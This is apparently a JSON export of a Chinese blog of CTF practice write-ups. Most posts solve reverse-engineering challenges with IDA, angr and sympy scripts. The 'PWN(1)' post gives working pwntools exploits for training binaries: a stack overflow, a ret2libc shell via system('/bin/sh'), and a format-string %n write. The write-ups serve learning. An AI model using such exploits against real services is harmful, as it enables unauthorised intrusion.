{"pages":[{"title":"board","text":"","link":"/board/index.html"}],"posts":[{"title":"1.22刷题记录","text":"1.22 刷题记录摸了好久的鱼了，现在属于是康复训练 testre 2019西湖论剑预选赛拖进ida后第一件事——shift+f12查看字符串 发现base64和base58的码表 随后进入主函数 其中sub_400D00函数只是读取字符串而已，继续查看sub_400700函数 开始时对输入的字符串进行了一次加密，但随后发现加密后的字符串并没有用到 中间进行了一些没有意义的循环和计算 随后就是对输入的字符串分别进行了base58和base64编码 但其实进行比较的是经过base58编码后的字符串 提取比较的字符串：D9cS9N9iHjMLTdA8YSMRMp，进行base58解码即得到flag：base58_is_boring","link":"/2022/01/21/1-22%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"BUUOJ Reverse(1)","text":"[CFI-CTF 2018]IntroToPE直接扔IDA，发现无法F5，转而查看汇编代码 在此处发现奇怪的Base64字符串，解码后得到flag:CFI{.NetC#_1s_@w3s0m3} [WUSTCTF2020]funnyre拖进ida分析 点进main函数，发现无法反编译为c代码，继续看汇编指令 发现有奇怪的指令，有几条jz、jnz和call指令都指向了不存在的地址，导致了F5的失败 将它们还有下面的几处都nop掉，再p一下得到了能看的c代码 一千多行，不是人能做的，寄！ 上网进行一个大佬的题解代码的抄，顺便了解了一下啥是符号执行（虽然还是不太懂 12345678910111213141516171819202122232425import angrimport claripyp=angr.Project('C:\\\\Users\\\\80424\\\\Downloads\\\\attachment',load_options={&quot;auto_load_libs&quot;: False})f=p.factorystate = f.entry_state(addr=0x400605)#设置state开始运行时的地址flag = claripy.BVS('flag',8*32)#要求的内容有32个，用BVS转成二进制给flag变量state.memory.store(0x603055+0x300+5,flag)#因为程序没有输入，所以直接把字符串设置到内存state.regs.rdx=0x603055+0x300state.regs.rdi=0x603055+0x300+5#然后设置两个寄存器sm = p.factory.simulation_manager(state)#准备从state开始遍历路径print(&quot;开始执行&quot;)sm.explore(find=0x401DAE)#遍历到成功的地址if sm.found: print(&quot;执行成功&quot;) x=sm.found[0].solver.eval(flag,cast_to=bytes) print(x)else: print('错误') 得到flag:flag{1dc20f6e3d497d15cef47d9a66d6f1af} 最后附上符号执行的相关资料： 5.3 符号执行 · CTF All In One (gitbooks.io) [羊城杯 2020]login下载附件，可以发现是python逆向题 使用pyinstxtractor整出.pyc文件 在解压出来的文件中发现login.pyc文件，使用010editor打开 打开struct.pyc文件，用该文件的前8字节替换login.pyc的前8字节，替换后的login.pyc文件如下 然后在线反编译pyc文件，得到login.py的代码 python反编译 - 在线工具 (tool.lu) 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport sysinput1 = input('input something:')if len(input1) != 14: print('Wrong length!') sys.exit()code = []for i in range(13): code.append(ord(input1[i]) ^ ord(input1[i + 1]))code.append(ord(input1[13]))a1 = code[2]a2 = code[1]a3 = code[0]a4 = code[3]a5 = code[4]a6 = code[5]a7 = code[6]a8 = code[7]a9 = code[9]a10 = code[8]a11 = code[10]a12 = code[11]a13 = code[12]a14 = code[13]if ((((a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5) + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36) + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60) + a14 * 29 == 22748) &amp; ((((a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25) + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66) + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39) + a14 * 17 == 7258) &amp; ((((a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65) + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33) + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34) + a14 * 23 == 26190) &amp; ((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 == 37136) &amp; (((a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52) + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36) + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; ((((a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45) + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26) + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61) + a14 * 28 == 17298) &amp; ((((a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42) + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47) + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44) + a14 * 65 == 19875) &amp; (((a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85) + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30) + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; ((((a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85) + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36) + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64) + a14 * 27 == 9710) &amp; (((((a1 * 67 - a2 * 68) + a3 * 68 - a4 * 51 - a5 * 43) + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38) + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52) + a14 * 31 == 13376) &amp; ((((a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51) + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6) + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67) + a14 * 78 == 24065) &amp; ((((a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5) + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35) + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61) + a14 * 20 == 27687) &amp; (((a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25) + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92) + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (((a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43) + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36) + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317): print('flag is GWHT{md5(your_input)}') print('Congratulations and have fun!')else: print('Sorry,plz try again...') 然后就是解方程 1234567891011121314151617181920212223242526272829303132from sympy import *import hashliba1=symbols('a1')a2=symbols('a2')a3=symbols('a3')a4=symbols('a4')a5=symbols('a5')a6=symbols('a6')a7=symbols('a7')a8=symbols('a8')a9=symbols('a9')a10=symbols('a10')a11=symbols('a11')a12=symbols('a12')a13=symbols('a13')a14=symbols('a14')print(solve([((((a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5) + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36) + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60) + a14 * 29 - 22748), ((((a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25) + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66) + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39) + a14 * 17 - 7258) ,((((a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65) + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33) + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34) + a14 * 23 - 26190) ,((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 * pow(2,7)) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 - 37136) ,(((a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52) + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36) + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 - 27915) ,((((a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45) + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26) + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61) + a14 * 28 - 17298) ,((((a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42) + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47) + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44) + a14 * 65 - 19875) ,(((a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85) + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30) + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 - 22784) ,((((a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85) + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36) + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64) + a14 * 27 - 9710) ,(((((a1 * 67 - a2 * 68) + a3 * 68 - a4 * 51 - a5 * 43) + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38) + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52) + a14 * 31 - 13376) ,((((a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51) + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6) + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67) + a14 * 78 - 24065) ,((((a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5) + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35) + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61) + a14 * 20 - 27687) ,(((a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25) + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92) + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 - 29250) ,(((a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43) + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36) + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 - 15317)],[a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14])) 得到结果：{a1: 119, a2: 24, a3: 10, a4: 7, a5: 104, a6: 43, a7: 28, a8: 91, a9: 52, a10: 108, a11: 88, a12: 74, a13: 88, a14: 33} 由于原输入和$a_i$ 不是一一对应的，需要稍微调整一下，然后在进行一个异或，最后md5一下就出来Flag了 12345678910111213import hashlibinput1=[10,24,119,7,104,43,28,91,108,52,88,74,88,33]for i in range(12,-1,-1): input1[i]^=input1[i+1]print(input1)flag=''for i in input1: flag+=chr(i)print(flag)print(len(flag))h=hashlib.md5()h.update(flag.encode())print(h.hexdigest()) flag{58964088b637e50d3a22b9510c1d1ef8}","link":"/2022/01/28/BUUOJ-Reverse-1/"},{"title":"BUUOJ Reverse 2","text":"[QCTF2018]Xman-babymips拖进ida，进到主函数，程序结构也比较简单 一开始先进行逐字节的异或处理 然后是一个循环移位的操作，然后与off_410D04指向的数组中的值比较一下得到结果 解题思路很简单，直接逆就行了 123456789101112131415def move1(num): return (num&gt;&gt;6)|(num&lt;&lt;2)&amp;0xffdef move2(num): return (num&gt;&gt;2)|(num&lt;&lt;6)&amp;0xffstr='Q|j{g'flag=''for i in range(5): flag+=chr(ord(str[i])^(32-i))t=[0,0,0,0,0,0x52,0xfd,0x16,0xa4,0x89,0xbd,0x92,0x80,0x13,0x41,0x54,0xa0,0x8d,0x45,0x18,0x81,0xde,0xfc,0x95,0xf0,0x16,0x79,0x1a,0x15,0x5b,0x75,0x1f]for i in range(5,32): if i&amp;1==1: flag+=chr(move1(t[i])^(32-i)) else: flag+=chr(move2(t[i])^(32-i))print(flag) qctf{ReA11y_4_B@89_mlp5_4_XmAn_} [SCTF2019]babyre拖进ida 发现一堆汇编代码，不能f5，大概是有花指令 按P声明函数，控制台显示有未定义指令，双击该地址进行去花 依次去了几处后就能反编译出Main函数了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118__int64 __fastcall main(int a1, char **a2, char **a3){ __int64 result; // rax char v4; // [rsp+Fh] [rbp-151h] int v5; // [rsp+10h] [rbp-150h] int v6; // [rsp+14h] [rbp-14Ch] char *v7; // [rsp+18h] [rbp-148h] char v8[10]; // [rsp+26h] [rbp-13Ah] BYREF _QWORD v9[2]; // [rsp+30h] [rbp-130h] BYREF int v10; // [rsp+40h] [rbp-120h] __int64 v11[3]; // [rsp+50h] [rbp-110h] BYREF char v12; // [rsp+68h] [rbp-F8h] __int64 v13[3]; // [rsp+70h] [rbp-F0h] BYREF char v14; // [rsp+88h] [rbp-D8h] __int64 v15[6]; // [rsp+90h] [rbp-D0h] BYREF __int16 v16; // [rsp+C0h] [rbp-A0h] char v17[136]; // [rsp+D0h] [rbp-90h] BYREF unsigned __int64 v18; // [rsp+158h] [rbp-8h] v18 = __readfsqword(0x28u); v5 = 0; v11[0] = 0LL; v11[1] = 0LL; v11[2] = 0LL; v12 = 0; v13[0] = 0LL; v13[1] = 0LL; v13[2] = 0LL; v14 = 0; v15[0] = 0LL; v15[1] = 0LL; v15[2] = 0LL; v15[3] = 0LL; v15[4] = 0LL; v15[5] = 0LL; v16 = 0; strcpy( v17, &quot;**************.****.**s..*..******.****.***********..***..**..#*..***..***.********************.**..*******..**...*..*.*.**.*&quot;); v9[0] = 0LL; v9[1] = 0LL; v10 = 0; v7 = &amp;v17[22]; strcpy(v8, &quot;sctf_9102&quot;); puts((const char *)(unsigned int)&quot;plz tell me the shortest password1:&quot;); scanf(&quot;%s&quot;, v15); v6 = 1; while ( v6 ) { v4 = *((_BYTE *)v15 + v5); switch ( v4 ) { case 'w': v7 -= 5; break; case 's': v7 += 5; break; case 'd': ++v7; break; case 'a': --v7; break; case 'x': v7 += 25; break; case 'y': v7 -= 25; break; default: v6 = 0; break; } ++v5; if ( *v7 != 46 &amp;&amp; *v7 != 35 ) v6 = 0; if ( *v7 == 35 ) { puts(&quot;good!you find the right way!\\nBut there is another challenge!&quot;); break; } } if ( v6 ) { puts((const char *)(unsigned int)&quot;plz tell me the password2:&quot;); scanf(&quot;%s&quot;, v11); ((void (__fastcall *)(__int64 *, __int64 *))loc_C22)(v11, v13); if ( (unsigned int)sub_F67(v13, v8) == 1 ) { puts(&quot;Congratulation!&quot;); puts((const char *)(unsigned int)&quot;Now,this is the last!&quot;); puts(&quot;plz tell me the password3:&quot;); scanf(&quot;%s&quot;, v9); if ( (unsigned int)sub_FFA(v9) == 1 ) { puts(&quot;Congratulation!Here is your flag!:&quot;); printf(&quot;sctf{%s-%s(%s)}&quot;, (const char *)v15, (const char *)v11, (const char *)v9); } else { printf(&quot;something srong...&quot;); } result = 0LL; } else { printf(&quot;sorry,somthing wrong...&quot;); result = 0LL; } } else { printf(&quot;sorry,is't not a right way...&quot;); result = 0LL; } return result;} 观察代码，大概是一个5*25的迷宫题,wasd分别为上下左右，还有xy为向上或向下跳5行，起点位于s处 第一个循环的路大概是sxss 接下来还有Password2，继续分析，进到loc_c22中查看 按p声明函数，控制台发现地址e1c处有未识别的数据： 按c转换为代码 然后在各种标红的地方还有一些奇怪的跳转处nop掉指令，最终成功能f5 然后第二部分是一个base64的解码 password2为c2N0Zl85MTAy 然后进到password3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990__int64 __fastcall sub_FFA(char *input3){ int v2; // [rsp+18h] [rbp-158h] int i; // [rsp+18h] [rbp-158h] int v4; // [rsp+1Ch] [rbp-154h] int v5; // [rsp+24h] [rbp-14Ch] int v6; // [rsp+28h] [rbp-148h] int v7; // [rsp+2Ch] [rbp-144h] int v8[16]; // [rsp+30h] [rbp-140h] int v9[16]; // [rsp+70h] [rbp-100h] int v10[26]; // [rsp+B0h] [rbp-C0h] unsigned int v11; // [rsp+118h] [rbp-58h] unsigned int v12; // [rsp+11Ch] [rbp-54h] unsigned int v13; // [rsp+120h] [rbp-50h] unsigned int v14; // [rsp+124h] [rbp-4Ch] unsigned __int64 v15; // [rsp+168h] [rbp-8h] v15 = __readfsqword(0x28u); v8[0] = 190; v8[1] = 4; v8[2] = 6; v8[3] = 128; v8[4] = 197; v8[5] = 175; v8[6] = 118; v8[7] = 71; v8[8] = 159; v8[9] = 204; v8[10] = 64; v8[11] = 31; v8[12] = 216; v8[13] = 191; v8[14] = 146; v8[15] = 239; v5 = (input3[6] &lt;&lt; 8) | (input3[5] &lt;&lt; 16) | (input3[4] &lt;&lt; 24) | input3[7]; v6 = (input3[10] &lt;&lt; 8) | (input3[9] &lt;&lt; 16) | (input3[8] &lt;&lt; 24) | input3[11]; v7 = (input3[14] &lt;&lt; 8) | (input3[13] &lt;&lt; 16) | (input3[12] &lt;&lt; 24) | input3[15]; v4 = 0; v2 = 4; v10[0] = sub_78A((input3[2] &lt;&lt; 8) | (input3[1] &lt;&lt; 16) | (*input3 &lt;&lt; 24) | (unsigned int)input3[3]); v10[1] = sub_78A(v5); v10[2] = sub_78A(v6); v10[3] = sub_78A(v7); do { v10[v2] = sub_143B(v10[v4], v10[v4 + 1], v10[v4 + 2], v10[v4 + 3]); ++v4; ++v2; } while ( v2 &lt;= 29 ); v9[0] = HIBYTE(v11); v9[1] = BYTE2(v11); v9[2] = BYTE1(v11); v9[3] = (unsigned __int8)v11; v9[4] = HIBYTE(v12); v9[5] = BYTE2(v12); v9[6] = BYTE1(v12); v9[7] = (unsigned __int8)v12; v9[8] = HIBYTE(v13); v9[9] = BYTE2(v13); v9[10] = BYTE1(v13); v9[11] = (unsigned __int8)v13; v9[12] = HIBYTE(v14); v9[13] = BYTE2(v14); v9[14] = BYTE1(v14); v9[15] = (unsigned __int8)v14; for ( i = 0; i &lt;= 15; ++i ) { if ( v9[i] != v8[i] ) return 0xFFFFFFFFLL; } return 1LL;}__int64 __fastcall sub_143B(int a1, int a2, int a3, unsigned int a4){ return a1 ^ (unsigned int)sub_1464(a2 ^ a3 ^ a4);}__int64 __fastcall sub_1464(unsigned int a1){ int v2; // [rsp+18h] [rbp-498h] int v3[290]; // [rsp+20h] [rbp-490h] BYREF unsigned __int64 v4; // [rsp+4A8h] [rbp-8h] v4 = __readfsqword(0x28u); qmemcpy(v3, &amp;unk_1940, 0x480uLL); v2 = (v3[BYTE2(a1)] &lt;&lt; 16) | v3[(unsigned __int8)a1] | (v3[BYTE1(a1)] &lt;&lt; 8) | (v3[HIBYTE(a1)] &lt;&lt; 24); return __ROL4__(v2, 12) ^ (unsigned int)(__ROL4__(v2, 8) ^ __ROR4__(v2, 2)) ^ __ROR4__(v2, 6);} 对加密算法进行逆向： 1234567891011121314151617181920212223242526272829303132from libnum import n2sf=open('55','rb')table=[]for i in range(68): line=f.read(16) for j in range(len(line)): if j%4==0: table.append(line[j])for i in range(0,len(table),4): print(hex(table[i]),hex(table[i+1]),hex(table[i+2]),hex(table[i+3]))def sub_143b(a1,a2,a3,a4): return a1^sub_1464(a2^a3^a4)def sub_1464(a1): v2=(table[a1&gt;&gt;24]&lt;&lt;24)|(table[(a1&gt;&gt;16)&amp;0xff]&lt;&lt;16)|(table[(a1&gt;&gt;8)&amp;0xff]&lt;&lt;8)|(table[a1&amp;0xff]) return rol(v2,12)^rol(v2,8)^ror(v2,2)^ror(v2,6)def rol(a1,s): return ((a1&lt;&lt;s)|(a1&gt;&gt;(32-s)))&amp;0xffffffffdef ror(a1,s): return ((a1&gt;&gt;s)|(a1&lt;&lt;(32-s)))&amp;0xffffffffa = [0]*26a.append(0xBE040680)a.append(0xC5AF7647)a.append(0x9FCC401F)a.append(0xD8BF92EF)for i in range(25,-1,-1): a[i] = sub_143b(a[i+4],a[i+1],a[i+2],a[i+3])print(n2s(a[0])[::-1]+n2s(a[1])[::-1]+n2s(a[2])[::-1]+n2s(a[3])[::-1]) 最终得到flag:sctf{sxss-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)} [2019红帽杯]Snake（不看dl的wp完全不会系列，就连wp也跟dl一样系列） 下载附件，解压发现是个有Unity写的游戏 找到Assembly-CSharp.dll文件，拖进dnspy，找到游戏主函数GameObject 发现这个函数是在Interface中，就到文件中找Interface.dll，把它拖进ida 找到关键词，点进去，ctrl+s交叉引用定位关键代码 发现一串又臭又长的代码，观察题目的参数a1范围为[0,99]，便进行爆破 123456789101112import ctypesdef fxxk(i): dll = ctypes.cdll.LoadLibrary(&quot;C:\\\\Users\\\\80424\\\\Downloads\\\\attachment\\\\Snake\\\\Snake_Data\\\\Plugins\\\\Interface.dll&quot;) print(i) dll.GameObject(i) if __name__ == '__main__': for i in range(100): fxxk(i) 在漫长的等待后，得到flag:flag{Ch4rp_W1th_R$@}","link":"/2022/02/09/BUUOJ-Reverse-2/"},{"title":"PWN(1)","text":"初学pwn，在新手区逛一逛 guess_numchecksec一下 然后拖进ida，进到main函数 程序主体就是一个猜数字的游戏，全部都猜对了就给flag（我们一般称这种人为赌怪） 问题出在了gets()函数（是它，又是它！） 观察主程序的栈，通过向v7输入长度为0x20的串后即可覆盖seed，借此控制了seed后就能够预先知道随机数的取值了。然后使用1(int)为种子写了一个简单的脚本 12345678from pwn import *# a=process(&quot;./b59204f56a0545e8a22f8518e749f19f&quot;)a=remote(&quot;111.200.241.244&quot;,&quot;63680&quot;)a.sendlineafter(&quot;name:&quot;,b&quot;a&quot;*0x20+b&quot;\\x00&quot;*7+b&quot;\\x01&quot;)a.interactive()#接下来依次输入以下数字即可2 5 4 2 6 2 5 1 4 2 话说只猜10次，每六分之一的概率，似乎可以暴力猜测（未曾设想的道路） int_overflowchecksec一下 拖进ida，发现有后门函数，同时没有开canary，大概是栈溢出覆盖返回地址了 程序问题在于读入了0x199长度的字符串并将其传入check_passwd函数，在该函数中又通过strcpy()函数将读入的字符串赋给了dest，而dest的栈空间只有0x14-0x9那么大，因此能借此覆盖该函数的返回值。 那么现在的问题在于如何绕开if的判断限制 观察v3的类型，其最大值仅为255而已，当s长度为260~264时，由于数值溢出v3的值依然是处于4~8，由此我们可以构造出解题脚本 1234567from pwn import *# a=process(&quot;./a.out&quot;)a=remote(&quot;111.200.241.244&quot;,&quot;59671&quot;)a.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)a.sendlineafter(&quot;username:\\n&quot;,&quot;abc&quot;)a.sendlineafter(&quot;passwd:\\n&quot;,b&quot;a&quot;*0x18+p32(0x0804868b)+b&quot;a&quot;*232)a.interactive() 得到flag:cyberpeace{f6af6201f84108f5701dab55abbb5c3f} cgpwn2checksec一下 扔进ida，发现有后门函数_system()，但是没有””/bin/sh”。发现有gets()，且name存放在bss段，不会被清除，随后进行一个栈的溢出 编写脚本： 123456from pwn import *# a=process(&quot;./53c24fc5522e4a8ea2d9ad0577196b2f&quot;)a=remote(&quot;111.200.241.244&quot;,&quot;50787&quot;)a.sendlineafter(&quot;name&quot;,&quot;/bin/sh&quot;)a.sendlineafter(&quot;here&quot;,b&quot;a&quot;*0x2a+p32(0x08048420)+4*b&quot;a&quot;+p32(0x0804a080))a.interactive() 获得flag level3checksec一下 用ida打开，主要问题在以下函数： 1234567ssize_t vulnerable_function(){ char buf[136]; // [esp+0h] [ebp-88h] BYREF write(1, &quot;Input:\\n&quot;, 7u); return read(0, buf, 0x100u);} 定义了长度为136的数组，却接受了0x100长度的输入，存在栈溢出的漏洞 level3中并没有system()函数和/bin/sh的字符串，要到所给的另一个附件Libc中找 首先通过覆盖返回值，使其执行write函数，输出got表中的地址，在计算偏移地址 从而得到libc中system函数在运行时的真正地址和/bin/sh字符串的地址 从而第二次执行栈溢出，覆盖返回地址为计算出的system的真正运行地址 附上脚本： 1234567891011121314151617181920212223242526272829# -*- coding: UTF-8 -*-from pwn import *r=remote(&quot;111.200.241.244&quot;,&quot;51966&quot;)elf=ELF(&quot;./level3&quot;)writeplt=elf.plt[&quot;write&quot;]writegot=elf.got[&quot;write&quot;]func=elf.symbols[&quot;vulnerable_function&quot;]libc=ELF(&quot;./libc_32.so.6&quot;)writelibc=libc.symbols[&quot;write&quot;]syslibc=libc.symbols[&quot;system&quot;]binlibc=libc.search(b&quot;/bin/sh&quot;).__next__()payload1=b'a'*0x88+b'aaaa'+p32(writeplt)+p32(func)+p32(1)+p32(writegot)+p32(4)#再次返回func函数为了是进行二次溢出，后面三个分别是wirte函数的参数# 1表示标准输出流stdout,中间是write是要输出的地址，这里要输出writegot，4是输出的长度r.recvuntil(&quot;Input:\\n&quot;)r.sendline(payload1)writeaddr=u32(r.recv(4))sysaddr=writeaddr-writelibc+syslibcbinaddr=writeaddr-writelibc+binlibcpayload2=b'a'*0x88+b'bbbb'+p32(sysaddr)+p32(0xaaaa)+p32(binaddr)r.recvuntil(&quot;Input:\\n&quot;)r.sendline(payload2)r.interactive() 得到flag:cyberpeace{74ba6840cf36f19427c62624ab180b50} CGfsbchecksec一下 扔进ida，看到printf(s)，可以知道与字符串漏洞有关 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp){ _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF __int16 v5; // [esp+26h] [ebp-76h] char s[100]; // [esp+28h] [ebp-74h] BYREF unsigned int v7; // [esp+8Ch] [ebp-10h] v7 = __readgsdword(0x14u); setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); buf[0] = 0; buf[1] = 0; v5 = 0; memset(s, 0, sizeof(s)); puts(&quot;please tell me your name:&quot;); read(0, buf, 0xAu); puts(&quot;leave your message please:&quot;); fgets(s, 100, stdin); printf(&quot;hello %s&quot;, (const char *)buf); puts(&quot;your message is:&quot;); printf(s); if ( pwnme == 8 ) { puts(&quot;you pwned me, here is your flag:\\n&quot;); system(&quot;cat flag&quot;); } else { puts(&quot;Thank you!&quot;); } return 0;} 看伪代码，需要pwnme=8才能得到flag，双击得到地址0x0804a068 接着看偏移量，得到偏移量为10 构造payload，通过%n偏移10来改变pwnme的值 123456from pwn import *a=process(&quot;e41a0f684d0e497f87bb309f91737e4d&quot;)a.sendafter(&quot;name:&quot;,&quot;abc&quot;)payload=p32(0x0804a068)+b&quot;aaaa&quot;+b&quot;%10$n&quot;a.sendafter(&quot;please&quot;,payload)a.interactive() 得到flag （服务器又又又开摆了，开不了靶机交互不了，无语了）","link":"/2022/02/08/PWN-1/"},{"title":"Reverse 3","text":"[FlareOn2]very_success拖进ida开始分析 关键在sub_401084中，点进去查看 12345678910111213141516171819202122232425262728293031323334353637383940414243int __usercall sub_401084@&lt;eax&gt;(int result@&lt;eax&gt;, int a2, char *input, int a4){ __int16 v4; // bx int v5; // ecx _BYTE *v7; // edi char v8; // al unsigned int v9; // kr00_4 char v10; // al char v11; // cf __int16 v12; // ax bool v13; // zf _BYTE *v14; // edi int v15; // [esp+0h] [ebp-Ch] v4 = 0; v5 = 37; if ( a4 &gt;= 37 ) { v7 = (_BYTE *)(a2 + 36); while ( 1 ) { LOWORD(result) = 455; v15 = result; v8 = *input++; v9 = __readeflags(); v10 = v15 ^ v8; __writeeflags(v9); v12 = (unsigned __int8)(__ROL1__(1, v4 &amp; 3) + v11 + v10);//加密 v4 += v12; v13 = *v7 == (unsigned __int8)v12; //此行进行对比 v14 = v7 + 1; if ( !v13 ) // v13需要=1 LOWORD(v5) = 0; result = v15; if ( !v5 ) break; v7 = v14 - 2; if ( !--v5 ) return result; } } return 0;}//为便于阅读，代码有改动 可以发现加密流程就是将输入的字符与一个常数result异或后，与常数v11和1&lt;&lt;(v4&amp;3)相加，每一次循环后v4便加上v12的值 通过v12和v7的值的对比可以判断flag是否正确，因此关键在于得到v7的值 动调得到v7中的值： 接着通过动调发现v11的值在加密时始终为1（这点比较诡异，在未加密是v11的值会在0、1间反复横跳） 最终写出解题脚本： 123456789101112131415161718def rol(a,b): return (a&lt;&lt;b)|(a&gt;&gt;(8-b))&amp;0xffa=[0xAA ,0xEC ,0xA4 ,0xBA ,0xAF ,0xAE ,0xAA,0x8A ,0xC0 ,0xA7 ,0xB0 ,0xBC ,0x9A ,0xBA ,0xA5 ,0xA5 ,0xBA ,0xAF ,0xB8 ,0x9D ,0xB8 ,0xF9 ,0xAE,0x9D ,0xAB ,0xB4 ,0xBC ,0xB6 ,0xB3 ,0x90 ,0x9A ,0xA8 ]a=a[::-1]v4=0v11=0flag=[]for i in a: v10=(i-rol(1,v4&amp;3)-1)%256 v4+=i flag.append(v10^0x1901c7%256)str=''for i in flag: str+=chr(i)print(str)#a_Little_b1t_harder_plez@flare-o 结合题目提示，得到flag:flag{a_Little_b1t_harder_plez@flare-on.com} [CISCN2018]2ex拖进ida,shift+f12看字符串 结合out.txt内容： 1│_r-+_Cl5;vgq_pdme7#7eC0= 有理由怀疑这是base64变种 继续跟踪，发现这个函数，显然是base64的编码 码表为 尝试将out.txt中内容根据码表内容进行解码，得到flag:flag{change53233} [SCTF2019]Who is he下载压缩包，发现是unity游戏，打开运行一下 发现是一段鬼畜视频，挺带感的 把Assembly-CSharp.dll拖进dnSpy中，找到OnClick()函数，发现是将输入的数据与解密后的已加密的flag进行对比从而判断正确 12345678910111213141516public void OnClick(){ Debug.Log(&quot;Button Clicked. TestClick.&quot;); Debug.Log(this.Name.text); bool flag = this.Name.text.Equals(this.Decrypt(this.EncryptData)); if (flag) { Debug.Log(&quot;Right&quot;); TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Haha, same as you!&quot;, &quot;Info:&quot;, 0); } else { Debug.Log(&quot;Wrong&quot;); 